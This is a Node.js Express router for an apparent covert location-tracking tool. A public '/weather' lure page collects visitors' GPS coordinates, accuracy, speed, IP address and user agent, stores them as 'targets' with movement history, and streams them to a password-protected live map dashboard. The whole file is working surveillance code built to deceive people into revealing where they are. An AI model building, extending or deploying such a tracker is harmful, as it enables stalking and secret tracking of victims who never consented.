const express = require("express")
const router = express.Router()
const config = require("./config")

// In-memory store for targets
const TARGETS = {}
const MAX_HISTORY_POINTS = 200

// Login Page
router.route("/login")
    .get((req, res) => {
        res.render("login", { error: null })
    })
    .post((req, res) => {
        const { username, password } = req.body

        if (config.username === username && config.password === password) {
            res.cookie("token", config.token, {
                maxAge: 30 * 24 * 60 * 60 * 1000, // 30 days
                httpOnly: true,
                sameSite: "lax"
            })
            return res.redirect("/")
        }

        res.render("login", { error: "Invalid username or password" })
    })

// Logout Page
router.route("/logout").get((req, res) => {
    res.clearCookie("token").redirect("/login")
})

// Target landing & reporting endpoint (Unauthenticated)
router.route("/weather")
    .get((req, res) => {
        res.render("weather")
    })
    .post((req, res) => {
        let { id, lat, lng, accuracy, speed, type } = req.body

        // Validation & Sanitization
        if (!id || typeof id !== "string") {
            return res.status(400).send("Invalid Target ID")
        }
        // Sanitize ID: only letters, digits, underscores, hyphens, and dots
        id = id.trim().replace(/[^a-zA-Z0-9_\-\.]/g, "").slice(0, 32)
        if (!id) {
            id = "target_" + Date.now()
        }

        const numLat = parseFloat(lat)
        const numLng = parseFloat(lng)
        if (isNaN(numLat) || isNaN(numLng) || numLat < -90 || numLat > 90 || numLng < -180 || numLng > 180) {
            return res.status(400).send("Invalid Coordinates")
        }

        const numAccuracy = (accuracy != null && !isNaN(parseFloat(accuracy))) ? Math.max(0, parseFloat(accuracy)) : null
        const numSpeed = (speed != null && !isNaN(parseFloat(speed))) ? Math.max(0, parseFloat(speed)) : null
        const now = Date.now()

        const isNew = !TARGETS[id]
        if (isNew) {
            TARGETS[id] = {
                id,
                lat: numLat,
                lng: numLng,
                accuracy: numAccuracy,
                speed: numSpeed,
                firstSeen: now,
                lastSeen: now,
                type: type || (numAccuracy && numAccuracy < 200 ? "GPS" : "Network"),
                ip: req.ip || req.headers["x-forwarded-for"] || "Unknown",
                userAgent: req.headers["user-agent"] || "Unknown",
                history: []
            }
            if (global.IO) {
                global.IO.emit("user-connected", TARGETS[id])
            }
        } else {
            TARGETS[id].lat = numLat
            TARGETS[id].lng = numLng
            TARGETS[id].accuracy = numAccuracy
            TARGETS[id].speed = numSpeed
            TARGETS[id].lastSeen = now
            if (type) TARGETS[id].type = type
        }

        // Add to history
        TARGETS[id].history.push({
            lat: numLat,
            lng: numLng,
            accuracy: numAccuracy,
            speed: numSpeed,
            time: now
        })

        // Cap history to avoid unbounded memory growth
        if (TARGETS[id].history.length > MAX_HISTORY_POINTS) {
            TARGETS[id].history.shift()
        }

        const payload = {
            id,
            lat: numLat,
            lng: numLng,
            accuracy: numAccuracy,
            speed: numSpeed,
            time: now,
            historyLength: TARGETS[id].history.length
        }

        if (global.IO) {
            global.IO.emit("map-data", payload)
            global.IO.emit("target-updated", TARGETS[id])
        }

        console.log(`[TARGET UPDATE] ${id} -> (${numLat.toFixed(5)}, ${numLng.toFixed(5)}) Acc: ${numAccuracy ? numAccuracy.toFixed(1) + 'm' : 'N/A'}`)
        res.send("OK")
    })

// Token checking middleware for protected admin routes
router.use(function checkToken(req, res, next) {
    const token = req.cookies.token
    if (token != null && token === config.token) {
        next()
    } else {
        res.clearCookie("token").redirect("/login")
    }
})

// Home / Dashboard
router.route("/").get((req, res) => {
    res.render("home", {
        TARGETS,
        targetsJSON: JSON.stringify(TARGETS),
        remoteURL: global.remoteURL || `http://localhost:${config.port}`
    })
})

// Live Map View for a target
router.route("/map").get((req, res) => {
    const { id } = req.query
    const target = TARGETS[id]

    if (!target) {
        return res.redirect("/")
    }

    res.render("map", {
        targetJSON: JSON.stringify(target),
        id: target.id
    })
})

// API: Delete a target
router.post("/api/target/delete", (req, res) => {
    const { id } = req.body
    if (TARGETS[id]) {
        delete TARGETS[id]
        if (global.IO) {
            global.IO.emit("target-deleted", id)
        }
        return res.json({ success: true })
    }
    res.status(404).json({ error: "Target not found" })
})

// API: Clear history for a target
router.post("/api/target/clear-history", (req, res) => {
    const { id } = req.body
    if (TARGETS[id]) {
        TARGETS[id].history = [
            {
                lat: TARGETS[id].lat,
                lng: TARGETS[id].lng,
                accuracy: TARGETS[id].accuracy,
                speed: TARGETS[id].speed,
                time: TARGETS[id].lastSeen
            }
        ]
        if (global.IO) {
            global.IO.emit("history-cleared", id)
        }
        return res.json({ success: true })
    }
    res.status(404).json({ error: "Target not found" })
})

// API: Clear all targets
router.post("/api/targets/clear-all", (req, res) => {
    for (const key in TARGETS) {
        delete TARGETS[key]
    }
    if (global.IO) {
        global.IO.emit("targets-cleared")
    }
    res.json({ success: true })
})

module.exports = router
